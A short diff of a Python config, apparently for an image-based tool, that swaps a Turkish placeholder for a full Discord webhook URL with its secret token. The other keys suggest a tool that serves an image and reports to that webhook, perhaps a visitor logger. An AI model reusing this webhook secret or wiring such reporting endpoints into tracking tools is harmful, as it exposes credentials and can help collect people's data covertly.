@@ -10,7 +10,7 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "webhook adresiniz",
+    "webhook": "https://discord.com/api/webhooks/1434011862139273287/rICD1g1pbX51grDfRHC1INmXRhtlJtSRwdBw3tQVEoNsEUC0AC42qK81NCon56iy4Nxl",
     "image": "fotografin adresi", 
     "imageArgument": True,
 
